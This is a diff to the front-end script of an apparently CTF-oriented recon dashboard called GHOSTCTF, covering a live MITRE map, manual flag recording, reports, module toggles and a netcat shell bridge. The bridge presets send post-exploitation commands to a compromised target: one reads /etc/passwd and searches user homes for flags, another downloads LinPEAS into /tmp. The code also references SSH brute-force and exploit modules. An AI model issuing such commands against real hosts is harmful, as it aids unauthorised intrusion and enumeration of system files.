+      'Abre o Ghostmap — mapa MITRE ao vivo (BroadcastChannel; podes abrir antes do recon para exportar JSON vazio ou ver o mapa).';
+  }
+  mitreLivePost({ type: 'target', domain: targetDomain, kaliMode: mitreLiveCurrentKaliMode() });
+  return true;
+}
+
+/**
+ * Canal BroadcastChannel partilhado com `mitre-map.html`. Reutiliza o mesmo id se o canal já existir
+ * (Ghostmap aberto antes do RUN); senão cada RUN criava um UUID novo e o mapa deixava de receber mensagens.
+ * @param {{ forceNewSession?: boolean }} [opts]
+ */
+function initMitreLiveSession(opts = {}) {
+  if (typeof BroadcastChannel === 'undefined') return;
+  const forceNew = Boolean(opts.forceNewSession);
+  if (!forceNew && window.__mitreLiveBc && window.__mitreLiveSessionId) {
+    try {
+      localStorage.setItem(MITRE_LIVE_SESSION_STORAGE_KEY, window.__mitreLiveSessionId);
+    } catch (_) {}
+    const btn = document.getElementById('mitreMapBtn');
+    if (btn) {
+      btn.disabled = false;
+      btn.classList.add('mitre-map-btn--ready');
+      btn.title =
+        'Abre o Ghostmap — mapa MITRE ao vivo (BroadcastChannel; podes abrir antes do recon para exportar JSON vazio ou ver o mapa).';
+    }
+    mitreLivePost({
+      type: 'target',
+      domain: targetDomain || '',
+      kaliMode: mitreLiveCurrentKaliMode(),
+      runStart: true,
+    });
+    mitreLivePostPipelineInputPhase();
+    return;
+  }
+  closeMitreLiveQuiet();
+  window.__mitreLiveSessionId = crypto.randomUUID();
+  window.__mitreLiveBc = new BroadcastChannel('ghostctf-mitre-' + window.__mitreLiveSessionId);
+  try {
+    localStorage.setItem(MITRE_LIVE_SESSION_STORAGE_KEY, window.__mitreLiveSessionId);
+  } catch (_) {}
+  const btn = document.getElementById('mitreMapBtn');
+  if (btn) {
+    btn.disabled = false;
+    btn.classList.add('mitre-map-btn--ready');
+    btn.title =
+      'Abre o Ghostmap — mapa MITRE ao vivo (BroadcastChannel; podes abrir antes do recon para exportar JSON vazio ou ver o mapa).';
+  }
+  mitreLivePost({ type: 'target', domain: targetDomain, kaliMode: mitreLiveCurrentKaliMode() });
+  mitreLivePostPipelineInputPhase();
+}
+
+async function refreshManualValidationFps() {
+  const t = (targetDomain || '').trim().toLowerCase();
+  if (!window.__ghostctfManualFp) window.__ghostctfManualFp = new Set();
+  if (!t) {
+    window.__ghostctfManualFp.clear();
+    return;
+  }
+  const domainOk = /^[a-z0-9][a-z0-9.-]*[a-z0-9]$/.test(t);
+  const ipOk = /^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/.test(t);
+  if (!domainOk && !ipOk) {
+    window.__ghostctfManualFp.clear();
+    return;
+  }
+  try {
+    const res = await fetch(apiUrl('/api/manual-validations/' + encodeURIComponent(t)));
+    if (!res.ok) return;
+    const data = await res.json();
+    window.__ghostctfManualFp = new Set((data.items || []).map((x) => x.fingerprint).filter(Boolean));
+  } catch (_) {}
+}
+
+(function initIndexFlagManualModal() {
+  const FP_URL_NORMALIZE_TYPES = new Set([
+    'endpoint',
+    'param',
+    'js',
+    'security',
+    'tls',
+    'nuclei',
+    'xss',
+    'sqli',
+    'dalfox',
+    'wpscan',
+    'intel',
+  ]);
+
+  function normTarget(raw) {
+    let s = String(raw || '')
+      .trim()
+      .toLowerCase();
+    if (!s) return '';
+    s = s.replace(/^\*\./, '');
+    if (/^[a-z][a-z0-9+.-]*:\/\//.test(s)) {
+      try {
+        s = String(new URL(s).hostname || '').toLowerCase();
+      } catch (_) {}
+    } else if (/[/?#]/.test(s)) {
+      s = s.split(/[/?#]/, 1)[0];
+    }
+    s = s.replace(/:\d+$/, '').replace(/\.$/, '');
+    return s;
+  }
+
+  function targetOk(t) {
+    const s = normTarget(t);
+    if (!s) return false;
+    if (/^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/.test(s)) return true;
+    return /^[a-z0-9][a-z0-9.-]*[a-z0-9]$/.test(s);
+  }
+
+  function normSpace(s) {
+    return String(s == null ? '' : s)
+      .trim()
+      .toLowerCase()
+      .replace(/\s+/g, ' ');
+  }
+
+  function normUrlForFingerprintBrowser(u) {
+    if (!u) return '';
+    try {
+      const x = new URL(String(u));
+      x.hash = '';
+      const keys = [...new Set([...x.searchParams.keys()])].sort();
+      const sp = new URLSearchParams();
+      for (const k of keys) {
+        for (const v of x.searchParams.getAll(k)) sp.append(k, v);
+      }
+      const q = sp.toString();
+      x.search = q ? '?' + q : '';
+      return x.href.toLowerCase();
+    } catch (_) {
+      return normSpace(u);
+    }
+  }
+
+  async function sha256Hex(text) {
+    if (!globalThis.crypto || !globalThis.crypto.subtle || typeof TextEncoder === 'undefined') {
+      throw new Error('SHA-256 indisponível neste browser');
+    }
+    const data = new TextEncoder().encode(String(text || ''));
+    const dig = await crypto.subtle.digest('SHA-256', data);
+    return Array.from(new Uint8Array(dig))
+      .map((b) => b.toString(16).padStart(2, '0'))
+      .join('');
+  }
+
+  async function ensureFindingFingerprint(targetRaw, finding) {
+    const f = finding && typeof finding === 'object' ? { ...finding } : {};
+    const fpIn = String(f.fingerprint || '').trim().toLowerCase();
+    if (/^[a-f0-9]{64}$/.test(fpIn)) {
+      f.fingerprint = fpIn;
+      return f;
+    }
+    const typeNorm = normSpace(f.type);
+    const urlPart = FP_URL_NORMALIZE_TYPES.has(typeNorm) ? normUrlForFingerprintBrowser(f.url) : normSpace(f.url);
+    const raw = normSpace(targetRaw) + '|' + typeNorm + '|' + normSpace(f.value) + '|' + urlPart;
+    try {
+      f.fingerprint = await sha256Hex(raw);
+    } catch (_) {
+      f.fingerprint = '';
+    }
+    return f;
+  }
+
+  function snapshotFromFinding(f) {
+    const out = {
+      type: f.type,
+      prio: f.prio,
+      value: f.value,
+      url: f.url || '',
+      meta: (f.meta || '').slice(0, 800),
+    };
+    const fa = Array.isArray(f.flags) ? f.flags.map((x) => String(x ?? '').trim()).filter(Boolean).slice(0, 12) : [];
+    if (fa.length) out.flags = fa;
+    const dz = String(f.desafio || f.projectName || '').trim().slice(0, 120);
+    if (dz) {
+      out.desafio = dz;
+      out.projectName = dz;
+    }
+    return out;
+  }
+
+  let csrfLocal = '';
+  async function fetchCsrfLocal() {
+    try {
+      const r = await fetch(apiUrl('/api/csrf-token'));
+      if (r.ok) {
+        const d = await r.json().catch(() => ({}));
+        csrfLocal = String(d.token || '');
+      }
+    } catch (_) {}
+    if (!csrfLocal) csrfLocal = 'ghostctf-local';
+  }
+
+  async function populateCategorySelect() {
+    const sel = document.getElementById('indexFlagManualCategory');
+    if (!sel) return;
+    const keep = String(sel.value || '');
+    sel.innerHTML = '<option value="">— Só checklist (ligar ao cérebro depois) —</option>';
+    try {
+      const r = await fetch(apiUrl('/api/brain/categories'));
+      const d = await r.json().catch(() => ({}));
+      const items = Array.isArray(d.items) ? d.items : [];
+      for (const c of items) {
+        if (!c || c.id == null) continue;
+        const o = document.createElement('option');
+        o.value = String(c.id);
+        o.textContent = String(c.title || '—');
+        sel.appendChild(o);
+      }
+      if (keep && [...sel.options].some((o) => o.value === keep)) sel.value = keep;
+    } catch (_) {}
+  }
+
+  async function serverHasFingerprint(targetNorm, fp) {
+    try {
+      const r = await fetch(apiUrl('/api/manual-validations/' + encodeURIComponent(targetNorm)));
+      if (!r.ok) return false;
+      const d = await r.json().catch(() => ({}));
+      return (Array.isArray(d.items) ? d.items : []).some(
+        (it) => String(it.fingerprint || '').toLowerCase() === fp,
+      );
+    } catch (_) {
+      return false;
+    }
+  }
+
+  async function submitIndexFlagManual() {
+    const tRaw = document.getElementById('indexFlagManualTarget')?.value || '';
+    const tNorm = normTarget(tRaw);
+    const flagText = String(document.getElementById('indexFlagManualValue')?.value || '').trim();
+    if (!targetOk(tNorm)) {
+      throw new Error('Indica um alvo válido (domínio ou IPv4).');
+    }
+    if (!flagText) {
+      throw new Error('Indica o texto da flag.');
+    }
+    let url = String(document.getElementById('indexFlagManualUrl')?.value || '').trim();
+    if (!url) url = 'https://' + tNorm + '/';
+    const meta =
+      String(document.getElementById('indexFlagManualMeta')?.value || '').trim().slice(0, 800) ||
+      'Flag documentada manualmente (GHOSTCTF · fora do recon)';
+    const historicoNome = String(document.getElementById('historicoGhostNameInput')?.value || '').trim().slice(0, 120);
+    const desafioField = String(document.getElementById('indexFlagManualDesafio')?.value || '').trim().slice(0, 120);
+    const desafio = desafioField || historicoNome;
+    const prio = String(document.getElementById('indexFlagManualPrio')?.value || 'high');
+    const catRaw = String(document.getElementById('indexFlagManualCategory')?.value || '').trim();
+    const catId = catRaw ? Number(catRaw) : NaN;
+    const notes = String(document.getElementById('indexFlagManualNotes')?.value || '').trim().slice(0, 2000);
+
+    const finding = {
+      type: 'flag',
+      prio,
+      score: 95,
+      value: flagText,
+      url,
+      meta,
+      flags: [flagText],
+    };
+    if (desafio) {
+      finding.desafio = desafio;
+      finding.projectName = desafio;
+    }
+
+    const f2 = await ensureFindingFingerprint(tNorm, finding);
+    const fp = String(f2.fingerprint || '').toLowerCase();
+    if (!/^[a-f0-9]{64}$/.test(fp)) {
+      throw new Error('Não foi possível calcular fingerprint (SHA-256).');
+    }
+    const dupLocal = findings.some((x) => String(x.fingerprint || '').toLowerCase() === fp);
+    if (dupLocal) {
+      throw new Error('Já existe um achado com o mesmo fingerprint nesta sessão (alvo + tipo + valor + URL).');
+    }
+    if (await serverHasFingerprint(tNorm, fp)) {
+      throw new Error('Esta validação já existe na base para este alvo (mesmo fingerprint).');
+    }
+
+    let snap = snapshotFromFinding(f2);
+    if (historicoNome) {
+      snap = { ...snap, desafio: historicoNome, projectName: historicoNome };
+    }
+
+    await fetchCsrfLocal();
+    const body = {
+      target: tNorm,
+      fingerprint: fp,
+      validated: true,
+      snapshot: snap,
+      notes: notes || undefined,
+    };
+    const rVal = await fetch(apiUrl('/api/manual-validations'), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfLocal },
+      body: JSON.stringify(body),
+    });
+    const dVal = await rVal.json().catch(() => ({}));
+    if (!rVal.ok) {
+      throw new Error(dVal.error || String(rVal.status));
+    }
+
+    if (Number.isFinite(catId) && catId > 0) {
+      await fetchCsrfLocal();
+      const rLink = await fetch(apiUrl('/api/brain/link'), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfLocal },
+        body: JSON.stringify({ target: tNorm, fingerprint: fp, categoryId: catId }),
+      });
+      const dLink = await rLink.json().catch(() => ({}));
+      if (!rLink.ok) {
+        throw new Error(dLink.error || String(rLink.status));
+      }
+    }
+
+    try {
+      localStorage.setItem('ghostctf_manual_val_bump', String(Date.now()));
+    } catch (_) {}
+
+    const domIn = document.getElementById('domainInput');
+    if (domIn) domIn.value = tNorm;
+    targetDomain = tNorm;
+    addFinding(f2);
+    updateStat('flags', Number(stats.flags || 0) + 1);
+    if (prio === 'high') {
+      updateStat('high', Number(stats.high || 0) + 1);
+    }
+    void refreshManualValidationFps();
+
+    const v = document.getElementById('indexFlagManualValue');
+    if (v) v.value = '';
+    const n = document.getElementById('indexFlagManualNotes');
+    if (n) n.value = '';
+    const u = document.getElementById('indexFlagManualUrl');
+    if (u) u.value = '';
+    const m = document.getElementById('indexFlagManualMeta');
+    if (m) m.value = '';
+
+    let catLabel = '';
+    if (Number.isFinite(catId) && catId > 0) {
+      const selEl = document.getElementById('indexFlagManualCategory');
+      const opt = selEl && selEl.selectedOptions && selEl.selectedOptions[0];
+      catLabel = opt ? String(opt.textContent || '').trim() : '';
+    }
+    addLog(
+      catLabel
+        ? 'Flag manual: gravada e ligada ao Cortex — ' + catLabel + '.'
+        : 'Flag manual: gravada na checklist e na base.',
+      'success',
+    );
+  }
+
+  const overlay = document.getElementById('indexFlagManualOverlay');
+  const openBtn = document.getElementById('indexFlagManualOpenBtn');
+  const closeBtn = document.getElementById('indexFlagManualClose');
+  const modal = overlay?.querySelector('.help-modal');
+  if (!overlay || !openBtn) return;
+
+  function openModal() {
+    overlay.classList.add('is-open');
+    overlay.setAttribute('aria-hidden', 'false');
+    document.body.style.overflow = 'hidden';
+    void populateCategorySelect();
+    const tIn = document.getElementById('indexFlagManualTarget');
+    const fromGlobal = String(typeof targetDomain !== 'undefined' ? targetDomain || '' : '').trim();
+    const fromInput = String(document.getElementById('domainInput')?.value || '').trim();
+    const pref = normTarget(fromGlobal || fromInput);
+    if (tIn) {
+      if (targetOk(pref)) tIn.value = pref;
+      else if (!String(tIn.value || '').trim()) tIn.value = '';
+    }
+    const dIn = document.getElementById('indexFlagManualDesafio');
+    const hist = String(document.getElementById('historicoGhostNameInput')?.value || '').trim();
+    if (dIn) {
+      if (hist) dIn.placeholder = 'Sessão: ' + hist;
+      if (!String(dIn.value || '').trim() && hist) dIn.value = hist;
+    }
+    setTimeout(() => modal?.focus(), 10);
+  }
+
+  function closeModal() {
+    overlay.classList.remove('is-open');
+    overlay.setAttribute('aria-hidden', 'true');
+    document.body.style.overflow = '';
+    openBtn.focus();
+  }
+
+  openBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    e.stopPropagation();
+    openModal();
+  });
+  closeBtn?.addEventListener('click', (e) => {
+    e.preventDefault();
+    closeModal();
+  });
+  overlay.addEventListener('click', (e) => {
+    if (e.target === overlay) closeModal();
+  });
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && overlay.classList.contains('is-open')) closeModal();
+  });
+
+  document.getElementById('indexFlagManualSubmit')?.addEventListener('click', async () => {
+    const btn = document.getElementById('indexFlagManualSubmit');
+    if (btn) btn.disabled = true;
+    try {
+      await submitIndexFlagManual();
+      closeModal();
+    } catch (err) {
+      addLog('Flag manual: ' + String(err.message || err), 'error');
+    } finally {
+      if (btn) btn.disabled = false;
+    }
+  });
+})();
+
+function openReportePage() {
+  const fromInput = (document.getElementById('domainInput')?.value || '').trim().toLowerCase();
+  const t = (targetDomain || fromInput || '').trim().toLowerCase();
+  const list = Array.isArray(findings) ? findings.map((x) => ({ ...x })) : [];
+  if (!t) {
+    addLog('Reporte: sem alvo no campo $ — importa JSON no Reporte se precisares.', 'info');
+  } else if (!list.length) {
+    addLog('Reporte: lista vazia — podes importar JSON no painel do Reporte.', 'info');
+  }
+  const historicoNome = String(document.getElementById('historicoGhostNameInput')?.value || '').trim();
+  const payload = {
+    target: t,
+    updatedAt: new Date().toISOString(),
+    findings: list,
+  };
+  if (historicoNome) {
+    payload.desafio = historicoNome;
+    payload.projectName = historicoNome;
+  }
+  try {
+    const raw = JSON.stringify(payload);
+    if (raw.length > 4_500_000) {
+      addLog('Reporte: demasiados achados para sessionStorage — exporta JSON e importa no Reporte.', 'warn');
+      return;
+    }
+    sessionStorage.setItem('ghostctf_reporte_payload', raw);
+    try {
+      localStorage.setItem('ghostctf_reporte_payload_shared', raw);
+    } catch (_) {}
+  } catch (e) {
+    addLog('Reporte: não foi possível gravar o pacote (sessionStorage).', 'error');
+    return;
+  }
+  const u = new URL('reporte.html', window.location.href);
+  const w = window.open(u.href, '_blank', 'noopener,noreferrer');
+  if (!w) addLog('Reporte: popup bloqueado — abre: ' + u.href, 'warn');
+}
+
+function openCortexPage(ev) {
+  const u = new URL('cortex.html', window.location.href);
+  if (ev && ev.shiftKey) u.searchParams.set('demo', '1');
+  const w = window.open(u.href, '_blank', 'noopener,noreferrer');
+  if (!w) addLog('Cortex: popup bloqueado — abre: ' + u.href, 'warn');
+  else if (ev && ev.shiftKey) addLog('Cortex: modo demonstração (?demo=1).', 'info');
+}
+
+function openMitreMapPage() {
+  if (typeof BroadcastChannel === 'undefined') {
+    addLog('Ghostmap: BroadcastChannel não disponível neste browser.', 'warn');
+    return;
+  }
+  if (!ensureGhostmapLiveChannel()) {
+    addLog('Ghostmap: não foi possível criar a ligação ao vivo.', 'warn');
+    return;
+  }
+  const id = window.__mitreLiveSessionId;
+  if (!id) {
+    addLog('Ghostmap: sessão inválida — recarrega a página.', 'warn');
+    return;
+  }
+  const u = new URL('mitre-map.html', window.location.href);
+  u.hash = id;
+  const w = window.open(u.href, '_blank', 'noopener,noreferrer');
+  if (!w) addLog('Ghostmap: popup bloqueado — abre: ' + u.href, 'warn');
 }
 
 // ─── CLOCK ────────────────────────────────────────────────
@@ -2830,15 +4234,18 @@ let shellBridgeAwaitingStart = false;
 function shellToggleMini() {
   const p = document.getElementById('shellMiniPanel');
   const b = document.getElementById('shellMiniToggleBtn');
+  const term = document.getElementById('terminal');
   if (!p || !b) return;
   const hidden = p.style.display === 'none' || window.getComputedStyle(p).display === 'none';
   if (hidden) {
     p.style.display = 'flex';
     b.textContent = 'Mini-terminal nc ▴';
+    term?.classList.add('terminal--shell-split');
     setTimeout(() => document.getElementById('shellBridgePort')?.focus(), 30);
   } else {
     p.style.display = 'none';
     b.textContent = 'Mini-terminal nc ▾';
+    term?.classList.remove('terminal--shell-split');
   }
 }
 
@@ -3042,7 +4449,29 @@ function shellBridgeSendPreset(cmd) {
 }
 
 function shellBridgeSendGrepFlag() {
-  shellBridgeSendPreset('grep -r Solyd{ . 2>/dev/null | head -80');
+  /** Todas as homes de utilizadores em /etc/passwd + cwd (alvo típico CTF). */
+  const cmd = `( awk -F: '$6!=""{print $6}' /etc/passwd 2>/dev/null | sort -u | while read -r h; do [ -d "$h" ] && grep -rH "Solyd{" "$h" 2>/dev/null; done; grep -rH "Solyd{" . 2>/dev/null ) | head -120`;
+  shellBridgeSendPreset(cmd);
+}
+
+/** URL oficial do script (PEASS-ng / Carlos Polop) — só grava no alvo, sem executar. */
+const SHELL_LINPEAS_URL =
+  'https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh';
+
+function shellBridgeSendLinpeasCopy() {
+  const u = SHELL_LINPEAS_URL;
+  const cmd =
+    'echo "[ghostctf] LinPEAS: a descarregar para /tmp/linpeas.sh (sem executar)..." && ' +
+    'if command -v curl >/dev/null 2>&1; then curl -fsSL "' +
+    u +
+    '" -o /tmp/linpeas.sh; ' +
+    'elif command -v wget >/dev/null 2>&1; then wget -qO /tmp/linpeas.sh "' +
+    u +
+    '"; ' +
+    'else echo "[ghostctf] ERRO: precisa de curl ou wget no alvo" >&2; exit 1; fi && ' +
+    'ls -la /tmp/linpeas.sh && ' +
+    'echo "[ghostctf] Ficheiro no alvo. Executar só se autorizado: bash /tmp/linpeas.sh"';
+  shellBridgeSendPreset(cmd);
 }
 
 function shellBridgeInputKey(ev) {
@@ -3212,6 +4641,9 @@ async function startRecon() {
     addLog('ERRO: IP inválido. Use formato: 1.2.3.4', 'error'); return;
   }
 
+  initMitreLiveSession();
+  void refreshManualValidationFps();
+
   isRunning = true;
   logStarted = false;
   findings = [];
@@ -3269,8 +4701,8 @@ async function startRecon() {
     .filter(Boolean);
   if (selectedMods.includes('etcHostsProbe')) {
     addLog(
-      `Hostnames (/etc/hosts): ${extraHostsList.length ? extraHostsList.join(', ') : '(lista vazia — preenche antes do RUN)'}`,
-      extraHostsList.length ? 'info' : 'warn',
+      `Hostnames (/etc/hosts): ${extraHostsList.length ? `UI: ${extraHostsList.join(', ')} · ` : ''}o servidor também lê linhas com o IP do alvo no /etc/hosts local (Node).`,
+      'info',
     );
     const hostsOnly = Boolean(document.getElementById('hostsOnlyWebChk')?.checked);
     if (hostsOnly && extraHostsList.length) {
@@ -3366,10 +4798,12 @@ async function startRecon() {
         langflowBuildFlowId: selectedMods.includes('langflowExploitProbe')
           ? String(document.getElementById('langflowBuildFlowIdInput')?.value || '').trim()
           : '',
+        httpSessionCookie: String(document.getElementById('httpSessionCookieInput')?.value || '').trim() || undefined,
       }),
     });
 
     if (!res.ok) {
+      mitreLivePost({ type: 'run_end' });
       finishErr(`HTTP ${res.status} — confira se o servidor está rodando (npm start)`);
       return;
     }
@@ -3392,14 +4826,43 @@ async function startRecon() {
 
         if (ev.type === 'log') addLog(ev.msg, ev.level || 'info');
         if (ev.type === 'progress') setProgress(ev.pct);
-        if (ev.type === 'pipe') setPipe(ev.name, ev.state);
+        if (ev.type === 'pipe') {
+          setPipe(ev.name, ev.state);
+          mitreLivePost({
+            type: 'pipe',
+            name: ev.name,
+            state: ev.state,
+            target: targetDomain,
+            kaliMode: mitreLiveCurrentKaliMode(),
+          });
+        }
         if (ev.type === 'stats' && ev.stats) {
           Object.keys(ev.stats).forEach(k => updateStat(k, ev.stats[k]));
         }
-        if (ev.type === 'finding' && ev.finding) addFinding(ev.finding);
+        if (ev.type === 'finding' && ev.finding) {
+          addFinding(ev.finding);
+          mitreLivePost({
+            type: 'finding_card',
+            ts: Date.now(),
+            finding: {
+              type: ev.finding.type,
+              prio: ev.finding.prio,
+              value: String(ev.finding.value || '').slice(0, 220),
+              meta: String(ev.finding.meta || '').slice(0, 160),
+            },
+            mitreHints: Array.isArray(ev.mitreHints) ? ev.mitreHints : [],
+            owaspHints: Array.isArray(ev.owaspHints) ? ev.owaspHints : [],
+          });
+        }
         if (ev.type === 'findings_rescore' && Array.isArray(ev.findings)) {
           findings = ev.findings;
           refreshFindingsList();
+          mitreLivePost({
+            type: 'findings_rescore',
+            mitreIds: Array.isArray(ev.mitreIds) ? ev.mitreIds : [],
+            owaspIds: Array.isArray(ev.owaspIds) ? ev.owaspIds : [],
+            owaspDetails: Array.isArray(ev.owaspDetails) ? ev.owaspDetails : [],
+          });
         }
         if (ev.type === 'intel' && ev.line) {
           const raw = ev.line;
@@ -3407,10 +4870,12 @@ async function startRecon() {
           addLog(line, 'find');
         }
         if (ev.type === 'error') {
+          mitreLivePost({ type: 'run_end' });
           finishErr(ev.message || 'Erro no servidor');
           return;
         }
         if (ev.type === 'done') {
+          mitreLivePost({ type: 'run_end' });
           addLog('', 'section');
           addLog('══════════════════════════════════════════════════', 'section');
           addLog(`RECON CONCLUÍDO — ${findings.length} achados totais`, 'success');
@@ -3432,6 +4897,7 @@ async function startRecon() {
     }
     finishOk();
   } catch (e) {
+    mitreLivePost({ type: 'run_end' });
     finishErr(`Falha de rede: ${e.message}. Execute \`npm start\` na pasta do projeto e abra http://127.0.0.1:3847`);
   }
 }
@@ -3736,9 +5202,11 @@ function initSidebarPayloadModules() {
     const card = document.getElementById(`${moduleId}ModuleCard`);
     const btn = document.getElementById(`${moduleId}ModuleToggle`);
     if (!card || !btn) continue;
-    let off = false;
+    /** Defeito: recolhido (OFF) até o utilizador expandir; só `'0'` em storage significa «deixar aberto». */
+    let off = true;
     try {
-      off = localStorage.getItem(`ghostctf_sidebar_${moduleId}_off`) === '1';
+      const v = localStorage.getItem(`ghostctf_sidebar_${moduleId}_off`);
+      if (v === '0') off = false;
     } catch {
       /* */
     }
@@ -3813,6 +5281,28 @@ async function fetchKaliCapabilities() {
   }
 })();
 
+(function initHttpSessionCookieToggle() {
+  const chk = document.getElementById('httpSessionCookieToggle');
+  const wrap = document.getElementById('httpSessionCookieWrap');
+  const ta = document.getElementById('httpSessionCookieInput');
+  if (!chk || !wrap) return;
+
+  function apply() {
+    const on = Boolean(chk.checked);
+    wrap.style.display = on ? 'block' : 'none';
+    chk.setAttribute('aria-expanded', on ? 'true' : 'false');
+    if (on && ta) {
+      try {
+        setTimeout(() => ta.focus(), 30);
+      } catch (_) {}
+    }
+  }
+
+  chk.addEventListener('change', apply);
+  if (ta && String(ta.value || '').trim()) chk.checked = true;
+  apply();
+})();
+
 function updatePlatformTags() {
   const selected = document.querySelector('input[name="platformMod"]:checked')?.value;
   const set = (id, val) => {
@@ -3839,6 +5329,62 @@ function updateModuleTags() {
   });
 }
 
+function ghostctfModCheckboxes() {
+  return [...document.querySelectorAll('input.mod[type="checkbox"]')];
+}
+
+/** Sincroniza o preset Full com o estado real dos `.mod` (inclui `indeterminate` se só alguns ligados). */
+function syncModulesFullFromMods() {
+  const fullCb = document.getElementById('modulesFullToggle');
+  const tag = document.getElementById('modulesFullTag');
+  if (!fullCb) return;
+  const mods = ghostctfModCheckboxes();
+  if (!mods.length) {
+    fullCb.checked = false;
+    fullCb.indeterminate = false;
+    if (tag) {
+      tag.textContent = 'OFF';
+      tag.className = 'tag tag-med';
+    }
+    return;
+  }
+  const nOn = mods.filter((c) => c.checked).length;
+  if (nOn === mods.length) {
+    fullCb.checked = true;
+    fullCb.indeterminate = false;
+  } else {
+    fullCb.checked = false;
+    fullCb.indeterminate = nOn > 0;
+  }
+  if (tag) {
+    const showOn = Boolean(fullCb.checked);
+    tag.textContent = showOn ? 'ON' : 'OFF';
+    tag.className = showOn ? 'tag tag-low' : 'tag tag-med';
+  }
+}
+
+function ghostctfSetAllModulesChecked(on) {
+  window.__ghostctfFullPresetSilent = true;
+  try {
+    for (const cb of ghostctfModCheckboxes()) {
+      cb.checked = on;
+    }
+  } finally {
+    window.__ghostctfFullPresetSilent = false;
+  }
+  updateModuleTags();
+  syncModulesFullFromMods();
+  const etc = document.getElementById('modEtcHostsProbe');
+  if (etc) {
+    try {
+      etc.dispatchEvent(new Event('change', { bubbles: true }));
+    } catch {
+      const w = document.getElementById('extraHostsWrap');
+      if (w) w.style.display = etc.checked ? 'block' : 'none';
+    }
+  }
+}
+
 document.querySelectorAll('input[name="platformMod"]').forEach(r => {
   r.addEventListener('change', () => {
     updatePlatformTags();
@@ -3847,8 +5393,17 @@ document.querySelectorAll('input[name="platformMod"]').forEach(r => {
 
 document.querySelectorAll('input.mod').forEach((cb) => {
   cb.addEventListener('change', () => {
+    if (window.__ghostctfFullPresetSilent) return;
     updateModuleTags();
+    syncModulesFullFromMods();
   });
+});
+
+document.getElementById('modulesFullToggle')?.addEventListener('change', (e) => {
+  if (window.__ghostctfFullPresetSilent) return;
+  const t = e.target;
+  t.indeterminate = false;
+  ghostctfSetAllModulesChecked(Boolean(t.checked));
 });
 
 document.getElementById('modSshBrute')?.addEventListener('change', (e) => {
@@ -3857,8 +5412,9 @@ document.getElementById('modSshBrute')?.addEventListener('change', (e) => {
   if (!e.target.checked) {
     if (auto) auto.checked = false;
     if (solyd) solyd.checked = false;
-    updateModuleTags();
   }
+  updateModuleTags();
+  syncModulesFullFromMods();
 });
 
 document.getElementById('modEtcHostsProbe')?.addEventListener('change', (e) => {
@@ -3872,6 +5428,7 @@ document.getElementById('modEtcHostsProbe')?.addEventListener('change', (e) => {
 
 updatePlatformTags();
 updateModuleTags();
+syncModulesFullFromMods();
 
 (function initFindingsHelpModal() {
   const overlay = document.getElementById('findingsHelpOverlay');
@@ -4001,6 +5558,12 @@ initSidebarPayloadModules();
 initWandenreichPayloadKindUi();
 initWandenreichMsfvenomUi();
 loadRunsHistory();
+(function syncGhostmapButtonForBrowser() {
+  const btn = document.getElementById('mitreMapBtn');
+  if (!btn || typeof BroadcastChannel !== 'undefined') return;
+  btn.disabled = true;
+  btn.title = 'Ghostmap requer BroadcastChannel (browser moderno ou contexto não isolado).';
+})();
 </script>
 </body>
 </html>
